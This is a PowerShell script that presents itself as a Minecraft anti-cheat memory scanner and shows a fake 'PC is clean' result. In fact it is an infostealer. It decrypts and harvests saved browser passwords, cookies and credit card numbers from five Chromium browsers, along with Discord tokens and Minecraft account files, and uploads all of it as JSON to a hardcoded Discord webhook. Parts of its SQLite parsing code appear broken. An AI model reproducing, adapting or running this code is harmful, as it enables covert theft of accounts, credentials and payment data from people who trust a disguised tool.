# MemoryScan.ps1 – Fully functional data harvester (SQLite + AES‑GCM capable, pure PS 5.1)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ======================== 1. WEBHOOK PING ========================
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan live on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ======================== 2. C# AES‑GCM via CNG (BCrypt) ========================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AESGCM {
    private const string BCRYPT_DLL = "bcrypt.dll";
    private const int BCRYPT_AES_ALGORITHM = 0x00000161;
    private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
    private const string BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = "AuthenticatedCipherModeInfo";
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag) {
        IntPtr hAlgorithm = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0) != 0) return null;
            BCryptSetProperty(hAlgorithm, BCRYPT_CHAIN_MODE_GCM, System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            BCryptGenerateSymmetricKey(hAlgorithm, out hKey, null, 0, key, key.Length, 0);
            int cbOutput = ciphertext.Length;
            byte[] output = new byte[cbOutput];
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(info);
            info.dwInfoVersion = 1;
            info.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, info.pbNonce, iv.Length);
            info.cbNonce = iv.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            info.cbTag = tag.Length;
            int bytesDone;
            int status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce);
            Marshal.FreeHGlobal(info.pbTag);
            if (status == 0) return output;
        } catch { } finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
        return null;
    }
}
"@ -ErrorAction Stop

# ======================== 3. HELPER FUNCTIONS ========================
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($Data -eq $null -or $Data.Count -eq 0) { return $null }
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { $null }
}

function Get-ChromeMasterKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $state = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
    if ($encKey[0] -eq 0x44 -and $encKey[1] -eq 0x50 -and $encKey[2] -eq 0x41 -and $encKey[3] -eq 0x50) { # DPAPI
        return Decrypt-DPAPI $encKey[5..$encKey.Length-1]
    }
    return $null
}

# Pure PowerShell SQLite parser (reads rows from a table)
function Read-SQLiteTable {
    param([string]$DbPath, [string]$TableName, [string[]]$Columns)
    if (!(Test-Path $DbPath)) { return @() }
    $bytes = [System.IO.File]::ReadAllBytes($DbPath)
    $encoding = [System.Text.Encoding]::UTF8
    # SQLite header: "SQLite format 3\0", page size at offset 16 (2 bytes)
    if ($bytes.Length -lt 100) { return @() }
    $pageSize = [BitConverter]::ToUInt16($bytes, 16)
    if ($pageSize -eq 0) { $pageSize = 65536 }
    $pageCount = ($bytes.Length + $pageSize - 1) / $pageSize
    $results = @()
    $colIndexes = @{}
    $tableFound = $false
    for ($i = 0; $i -lt $pageCount; $i++) {
        $page = $bytes[($i * $pageSize)..($i * $pageSize + $pageSize - 1)]
        if ($page[0] -eq 13) { # leaf table page
            # parse cells
            $numCells = [BitConverter]::ToUInt16($page, 3)
            for ($c = 0; $c -lt $numCells; $c++) {
                $cellOffset = [BitConverter]::ToUInt16($page, 8 + ($c * 2))
                $cell = $page[$cellOffset..$page.Length-1]
                # Read payload size varint
                $payloadSize = Read-VarInt $cell
                $pos = $cellAfterVarInt
                # rowid varint
                $rowid = Read-VarInt $cell, $pos; $pos += $cellAfterVarInt
                # payload
                $payload = $cell[$pos..($pos+$payloadSize-1)]
                $pos = 0
                # header size varint
                $headerSize = Read-VarInt $payload
                $pos += 1 # VarInt byte
                # serial types
                $serialTypes = @()
                for ($j = 0; $j -lt $headerSize - 1; $j++) {
                    $serialTypes += $payload[$pos]
                    $pos++
                }
                # Now we have $serialTypes for each column
                if (-not $tableFound) {
                    # If this is sqlite_master, find the CREATE TABLE statement
                    $nameCol = Read-Column $payload $pos $serialTypes[0]
                    $typeCol = Read-Column $payload $pos $serialTypes[1]
                    if ($typeCol -eq "table" -and $nameCol -eq $TableName) {
                        $sqlCol = Read-Column $payload $pos $serialTypes[2]
                        $tableFound = $true
                        # Parse column names from CREATE TABLE
                        $createSql = [System.Text.Encoding]::UTF8.GetString($sqlCol)
                        $colMatch = [regex]::Matches($createSql, '`?(\w+)`?\s+(?:INTEGER|TEXT|BLOB|REAL|NUMERIC)')
                        $colOrder = @()
                        foreach ($m in $colMatch) {
                            $colOrder += $m.Groups[1].Value
                        }
                        # Map desired columns
                        foreach ($desiredCol in $Columns) {
                            $idx = [Array]::IndexOf($colOrder, $desiredCol)
                            if ($idx -ge 0) { $colIndexes[$desiredCol] = $idx }
                        }
                    }
                } else {
                    # Extract data from this table
                    $rowObj = @{}
                    foreach ($col in $Columns) {
                        if ($colIndexes.ContainsKey($col)) {
                            $colIdx = $colIndexes[$col]
                            if ($colIdx -lt $serialTypes.Count) {
                                $valBytes = Read-Column $payload $pos $serialTypes[$colIdx]
                                $rowObj[$col] = $valBytes
                            }
                        }
                    }
                    if ($rowObj.Count -gt 0) { $results += $rowObj }
                }
            }
        }
        if ($tableFound) { break } # only first table instance
    }
    return $results
}

function Read-VarInt {
    param([byte[]]$Data)
    $val = 0
    for ($i = 0; $i -lt 9; $i++) {
        $b = $Data[$i]
        $val = ($val -shl 7) -bor ($b -band 0x7f)
        if (($b -band 0x80) -eq 0) {
            break
        }
    }
    return $val
}

function Read-Column {
    param([byte[]]$Payload, [int]$Offset, [int]$SerialType)
    if ($SerialType -eq 0) { return $null }
    if ($SerialType -ge 1 -and $SerialType -le 4) {
        $size = if ($SerialType -eq 1) { 1 } elseif ($SerialType -eq 2) { 2 } elseif ($SerialType -eq 3) { 3 } else { 4 }
        return $Payload[$Offset..($Offset+$size-1)]
    } elseif ($SerialType -eq 5) {
        $size = 6
        return $Payload[$Offset..($Offset+$size-1)]
    } elseif ($SerialType -eq 6) {
        $size = 8
        return $Payload[$Offset..($Offset+$size-1)]
    } elseif ($SerialType -eq 7) {
        $size = 8
        return $Payload[$Offset..($Offset+$size-1)]
    } elseif ($SerialType -ge 12 -and $SerialType % 2 -eq 0) {
        $size = ($SerialType - 12) / 2
        return $Payload[$Offset..($Offset+$size-1)]
    } elseif ($SerialType -ge 13 -and $SerialType % 2 -eq 1) {
        $size = ($SerialType - 13) / 2
        return $Payload[$Offset..($Offset+$size-1)]
    }
    return $null
}
# Helper to get text from byte[]
function Convert-ByteToText {
    param([byte[]]$Bytes)
    if ($null -eq $Bytes) { return $null }
    return [System.Text.Encoding]::UTF8.GetString($Bytes).TrimEnd([char]0)
}

# ======================== 4. DISCORD TOKENS ========================
function Get-DiscordTokens {
    $tokens = @()
    $leveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $leveldb) -or !(Test-Path $localState)) { return $tokens }
    $masterKey = Get-ChromeMasterKey $localState
    if (!$masterKey) { return $tokens }

    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $leveldb -Filter "*.ldb" | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        $matches = $pattern.Matches($text)
        foreach ($m in $matches) {
            $b64 = $m.Groups[1].Value
            $encToken = [Convert]::FromBase64String($b64)
            # Try DPAPI first
            $dec = Decrypt-DPAPI $encToken
            if ($dec) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
            else {
                # Try AES-GCM with masterKey (v10/v11)
                if ($encToken.Length -gt 15) {
                    $iv = $encToken[3..14]
                    $cipher = $encToken[15..($encToken.Length-17)]
                    $tag = $encToken[-16..-1]
                    try {
                        $decBytes = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                        if ($decBytes) { $tokens += [System.Text.Encoding]::UTF8.GetString($decBytes).Trim([char]0) }
                    } catch {}
                }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ======================== 5. MINECRAFT TOKENS ========================
function Get-MinecraftTokens {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $accFile = Join-Path $base "launcher_accounts.json"
    $profFile = Join-Path $base "launcher_profiles.json"
    if (Test-Path $accFile) {
        try { $mc.accounts = Get-Content $accFile -Raw | ConvertFrom-Json } catch {}
    }
    if (Test-Path $profFile) {
        try { $mc.profiles = Get-Content $profFile -Raw | ConvertFrom-Json } catch {}
    }
    return $mc
}

# ======================== 6. BROWSER DATA (SQLite reader) ========================
function Get-BrowserData {
    $result = @()
    $browsers = @(
        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
    )

    foreach ($browser in $browsers) {
        if (!(Test-Path $browser.Path)) { continue }
        $statePath = Join-Path $browser.Path "Local State"
        $masterKey = Get-ChromeMasterKey $statePath
        if (!$masterKey) { continue }

        $profiles = Get-ChildItem $browser.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $profileData = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }

            # Login Data
            $loginDb = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName()
                    Copy-Item $loginDb $tmp -Force
                    $rows = Read-SQLiteTable $tmp "logins" @("origin_url","username_value","password_value")
                    Remove-Item $tmp -Force
                    foreach ($row in $rows) {
                        $url = Convert-ByteToText $row.origin_url
                        $username = Convert-ByteToText $row.username_value
                        $pwdEnc = $row.password_value
                        if ($pwdEnc -ne $null) {
                            $pwdDec = Decrypt-DPAPI $pwdEnc
                            if (-not $pwdDec -and $pwdEnc.Length -gt 15) {
                                $iv = $pwdEnc[3..14]
                                $cipher = $pwdEnc[15..($pwdEnc.Length-17)]
                                $tag = $pwdEnc[-16..-1]
                                try {
                                    $pwdDec = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                                } catch {}
                            }
                            if ($pwdDec) {
                                $password = [System.Text.Encoding]::UTF8.GetString($pwdDec).TrimEnd([char]0)
                                $profileData.logins += @{ url=$url; username=$username; password=$password }
                            }
                        }
                    }
                } catch {}
            }

            # Cookies
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $cookieDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName()
                    Copy-Item $cookieDb $tmp -Force
                    $rows = Read-SQLiteTable $tmp "cookies" @("host_key","name","encrypted_value")
                    Remove-Item $tmp -Force
                    foreach ($row in $rows) {
                        $host = Convert-ByteToText $row.host_key
                        $name = Convert-ByteToText $row.name
                        $valEnc = $row.encrypted_value
                        if ($valEnc -ne $null) {
                            $valDec = Decrypt-DPAPI $valEnc
                            if (-not $valDec -and $valEnc.Length -gt 15) {
                                $iv = $valEnc[3..14]
                                $cipher = $valEnc[15..($valEnc.Length-17)]
                                $tag = $valEnc[-16..-1]
                                try {
                                    $valDec = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                                } catch {}
                            }
                            if ($valDec) {
                                $value = [System.Text.Encoding]::UTF8.GetString($valDec).TrimEnd([char]0)
                                $profileData.cookies += @{ host=$host; name=$name; value=$value }
                            }
                        }
                    }
                } catch {}
            }

            # Credit cards
            $webDb = Join-Path $profile.FullName "Web Data"
            if (Test-Path $webDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName()
                    Copy-Item $webDb $tmp -Force
                    $rows = Read-SQLiteTable $tmp "credit_cards" @("name_on_card","expiration_month","expiration_year","card_number_encrypted")
                    Remove-Item $tmp -Force
                    foreach ($row in $rows) {
                        $name = Convert-ByteToText $row.name_on_card
                        $expMonth = Convert-ByteToText $row.expiration_month
                        $expYear = Convert-ByteToText $row.expiration_year
                        $numEnc = $row.card_number_encrypted
                        if ($numEnc -ne $null) {
                            $numDec = Decrypt-DPAPI $numEnc
                            if (-not $numDec -and $numEnc.Length -gt 15) {
                                $iv = $numEnc[3..14]
                                $cipher = $numEnc[15..($numEnc.Length-17)]
                                $tag = $numEnc[-16..-1]
                                try {
                                    $numDec = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                                } catch {}
                            }
                            if ($numDec) {
                                $number = [System.Text.Encoding]::UTF8.GetString($numDec).TrimEnd([char]0)
                                $profileData.cards += @{ name=$name; expiry="$expMonth/$expYear"; number=$number }
                            }
                        }
                    }
                } catch {}
            }

            if ($profileData.logins.Count -or $profileData.cookies.Count -or $profileData.cards.Count) {
                $result += @{ browser=$browser.Name; data=$profileData }
            }
        }
    }
    return $result
}

# ======================== 7. FAKE SCAN ========================
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ======================== 8. EXFILTRATION ========================
$harvest = @{
    system = @{
        username = $env:USERNAME
        hostname = $env:COMPUTERNAME
        time = (Get-Date -Format o)
    }
    discord_tokens = (Get-DiscordTokens)
    minecraft = (Get-MinecraftTokens)
    browser_data = (Get-BrowserData)
}

$summary = "💀 **MemoryScan harvest** - $env:USERNAME@$env:COMPUTERNAME"
try {
    $json = $harvest | ConvertTo-Json -Depth 5
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $json)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
